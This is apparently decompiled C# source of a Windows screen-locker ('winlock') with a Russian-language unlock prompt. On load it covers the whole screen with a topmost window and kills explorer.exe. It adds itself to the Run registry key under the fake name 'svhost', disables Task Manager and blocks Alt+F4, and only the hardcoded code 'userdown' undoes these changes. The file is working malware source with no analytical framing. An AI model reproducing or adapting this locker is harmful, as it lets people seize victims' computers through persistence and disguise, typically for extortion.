using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using sysdriver.Properties;

namespace winlock;

public class Form1 : Form
{
	private IContainer components;

	private TextBox code;

	private Button unlock;

	private Label label1;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Expected O, but got Unknown
		code = new TextBox();
		unlock = new Button();
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)code).set_Anchor((AnchorStyles)2);
		((TextBoxBase)code).set_BorderStyle((BorderStyle)1);
		((Control)code).set_Location(new Point(228, 363));
		((Control)code).set_Name("code");
		((Control)code).set_Size(new Size(135, 20));
		((Control)code).set_TabIndex(0);
		((Control)unlock).set_Anchor((AnchorStyles)2);
		((Control)unlock).set_BackColor(SystemColors.AppWorkspace);
		((ButtonBase)unlock).set_FlatStyle((FlatStyle)3);
		((Control)unlock).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)unlock).set_Location(new Point(228, 389));
		((Control)unlock).set_Name("unlock");
		((Control)unlock).set_Size(new Size(135, 38));
		((Control)unlock).set_TabIndex(1);
		((Control)unlock).set_Text("Разблокировать");
		((ButtonBase)unlock).set_UseVisualStyleBackColor(false);
		((Control)unlock).add_Click((EventHandler)unlock_Click);
		((Control)label1).set_Anchor((AnchorStyles)2);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_ForeColor(SystemColors.ControlText);
		((Control)label1).set_Location(new Point(208, 331));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(175, 29));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("Введите код:");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.R140156019353_25_06);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(600, 480));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)unlock);
		((Control)this).get_Controls().Add((Control)(object)code);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public Form1()
	{
		InitializeComponent();
		((Form)this).set_KeyPreview(true);
	}

	[DllImport("user32.dll")]
	public static extern void SetCursorPos(int x, int y);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern bool BlockInput([In][MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

	protected override void OnKeyDown(KeyEventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Invalid comparison between Unknown and I4
		((Control)this).OnKeyDown(e);
		if ((int)e.get_KeyCode() == 115 && e.get_Alt())
		{
			e.set_Handled(true);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)this).set_Width(Screen.get_PrimaryScreen().get_Bounds().Width);
		((Control)this).set_Height(Screen.get_PrimaryScreen().get_Bounds().Height);
		Process.Start("cmd.exe", "/C taskkill /f /im explorer.exe");
		string executablePath = Application.get_ExecutablePath();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		try
		{
			registryKey.SetValue("svhost", executablePath);
			registryKey.Close();
		}
		catch
		{
		}
		SetCursorPos(500, 500);
		string value = "1";
		string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
		try
		{
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(subkey);
			registryKey2.SetValue("DisableTaskMgr", value);
			registryKey2.Close();
		}
		catch (Exception)
		{
		}
		Application.DoEvents();
	}

	private void unlock_Click(object sender, EventArgs e)
	{
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)code).get_Text() == "userdown")
		{
			Process.Start("C:\\Windows\\explorer.exe");
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
			try
			{
				registryKey.DeleteValue("svhost");
				registryKey.Close();
			}
			catch
			{
			}
			string value = "0";
			string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(subkey);
				registryKey2.SetValue("DisableTaskMgr", value);
				registryKey2.Close();
			}
			catch (Exception)
			{
			}
			Application.Exit();
		}
		else
		{
			MessageBox.Show("Неверный код!", "Ошибка!");
		}
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}
}
